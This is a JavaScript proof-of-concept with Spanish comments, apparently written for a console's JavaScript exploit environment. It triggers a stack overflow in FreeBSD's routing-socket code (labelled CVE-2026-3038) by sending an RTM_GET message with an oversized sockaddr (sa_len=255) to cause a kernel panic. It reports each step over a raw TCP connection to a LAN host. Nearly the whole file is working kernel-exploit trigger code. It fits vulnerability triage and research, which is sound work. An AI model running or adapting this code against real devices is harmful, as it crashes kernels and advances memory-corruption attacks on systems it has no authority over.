// 2026-08-27 p5_rtsock_1320: test P5 (CVE-2026-3038, SA-26:05.route) -> stack overflow 127B en rtsock_msg_buffer() via RTM_GET con sockaddr inflado -> panic canary.
// Bug: bcopy(sa,&ss,sa->sa_len) con sa_len>128 desborda ss en stack; patch SA-26_05_route: KASSERT->check EINVAL. Triage: RESEARCH/freebsd-sa-triage-2026-08.md §P5.
// ABI: AF_ROUTE=17 (sys/socket.h:188), SOCK_RAW=3 (:92); sendto=SYS 0x85 (global.js sendto:0x85n); route.h:240 RTM_VERSION=5, :248 RTM_GET=0x4, :280 RTA_DST=0x1.
// Layout rt_msghdr (route.h:225-238): msglen u16@0 ver u8@2 type u8@3 idx u16@4 pad6-8 flags@8 addrs@12 pid@16 seq@20 errno@24 fmask@28 inits u_long@32 rmx@40 (rt_metrics :70-83 = 14 u_long = 112B, rmx_filler[3] incl.) => 40+112 = sizeof=152; kernel camina SAs desde rtm+1=offset 152.
(() => {
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const E=(n,s)=>W("[p5] PASO "+n+": "+s+" - ejecutando"),R=(n,v)=>W("[p5] PASO "+n+" result: "+v);
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
const AF_ROUTE=17n,SOCK_RAW=3n,SCHED_YIELD=331n;
const RTM_VERSION=5,RTM_GET=0x4,RTA_DST=0x1,RMSG=152; // route.h:240,:248,:280; sizeof rt_msghdr=152 (verificado arriba)
// canal TCP crudo identico diag_raw3/p10
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);const cr=I(syscall(SYSCALL.connect,sock,sa,16n));if(cr<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
const mk=(pid)=>{for(let i=0;i<512;i++)write8(WB+B(i),0);write16(WB,0);write8(WB+2n,RTM_VERSION);write8(WB+3n,RTM_GET);write16(WB+4n,0);write32(WB+8n,0);write32(WB+12n,RTA_DST);write32(WB+16n,B(pid));write32(WB+20n,0);write32(WB+24n,0);write32(WB+28n,0);write64(WB+32n,0n);};
let pid1=0n,r2=null,r3=null,r4=null,e2=-1,e3=-1,e4=-1,alive=false;
// PASO 1: getpid + constantes + socket AF_ROUTE
E(1,"getpid + constantes (RTM_VERSION=5 RTM_GET=0x4 RTA_DST=0x1 sizeof(rt_msghdr)="+RMSG+") + socket(AF_ROUTE=17,SOCK_RAW=3,0)");
let asock=-1n;
try{pid1=I(syscall(SYSCALL.getpid));asock=I(syscall(SYSCALL.socket,AF_ROUTE,SOCK_RAW,0n));R(1,"pid="+pid1+" af_route_fd="+asock)}catch(e){R(1,"EX "+e)}
// PASO 2 BASELINE: RTM_GET bien formado, sa_len=16, dst 127.0.0.1. NO crashea. Sin recvfrom.
if(asock>=0n){E(2,"BASELINE RTM_GET sa_len=16 127.0.0.1 (NO debe crashear)");
 try{const L=B(RMSG+16);mk(pid1);write32(WB+20n,1);write8(WB+B(RMSG),16);write8(WB+B(RMSG)+1n,2);write16(WB+B(RMSG)+2n,0);write32(WB+B(RMSG)+4n,0x0100007Fn);write16(WB,Number(L));
  r2=I(syscall(SYSCALL.sendto,asock,WB,L,0n,0n,0n));if(r2<0)e2=EN();R(2,"sendto ret="+r2+(r2<0?" errno="+e2:" (ok)"))}catch(e){R(2,"EX "+e)}}else{R(2,"SKIPPED (sin fd AF_ROUTE)")}
// PASO 3 TRIGGER: sa_len=255 -> bcopy 255B a ss[128] -> overflow 127B -> panic canary esperado
E(3,"TRIGGER RTM_GET sa_len=255 msglen="+(RMSG+256));
N("[p5] TRIGGER: si la consola se reinicia, CVE-2026-3038 CONFIRMADO (canary panic)");
if(asock>=0n){try{const L=B(RMSG+256);mk(pid1);write32(WB+20n,2);
  for(let i=0;i<256;i++)write8(WB+B(RMSG)+B(i),0x42);
  write8(WB+B(RMSG),255);write8(WB+B(RMSG)+1n,2);write16(WB,Number(L));
  r3=I(syscall(SYSCALL.sendto,asock,WB,L,0n,0n,0n));if(r3<0)e3=EN();R(3,"sendto ret="+r3+(r3<0?" errno="+e3:" (retorno: NO hubo panic)"))}catch(e){R(3,"EX "+e)}}else{R(3,"SKIPPED")}
// PASO 4: si seguimos vivos: getpid + sendto benigno de verificacion
E(4,"post-trigger: getpid + sendto benigno (socket vivo?)");
try{const p4=I(syscall(SYSCALL.getpid));alive=true;R(4,"pid="+p4+" (misma pila? pid1="+pid1+")");
 if(asock>=0n){const L=B(RMSG+16);mk(pid1);write32(WB+20n,3);write8(WB+B(RMSG),16);write8(WB+B(RMSG)+1n,2);write32(WB+B(RMSG)+4n,0x0100007Fn);write16(WB,Number(L));
  r4=I(syscall(SYSCALL.sendto,asock,WB,L,0n,0n,0n));if(r4<0)e4=EN();R(4,"sendto benigno seq=3 ret="+r4+(r4<0?" errno="+e4:" (socket USABLE)"))}}catch(e){R(4,"EX "+e)}
if(alive)W("[p5] SIN PANIC: el trigger no crasheo (kernel parcheado o path no alcanzado)");
// PASO 5: close + resumen + bucle veredicto
let v;
if(!alive)v="PANIC (canary): no sobrevivi al trigger -> CVE-2026-3038 CONFIRMADO (hilo muerto con el kernel)";
else if(r3!==null&&r3>=0)v="SIN PANIC: trigger ret="+r3+" -> parcheado o path no alcanzado";
else if(r3!==null)v="SIN PANIC: trigger errno="+e3+" -> path no alcanzado (o EINVAL del patch)";
else v="inconcreto (baseline="+r2+" trigger="+r3+")";
E(5,"close + resumen");
try{if(asock>=0n)syscall(SYSCALL.close,asock);if(sock>=0n){syscall(SYSCALL.close,sock);}}catch(e){}
W("[p5] COMPLETO: "+v);N("[p5] "+v.slice(0,90));sock=-1n;
for(let i=0;i<20;i++){N("[p5] "+v.slice(0,90));for(let j=0;j<3000;j++){syscall(SCHED_YIELD)}}
})();
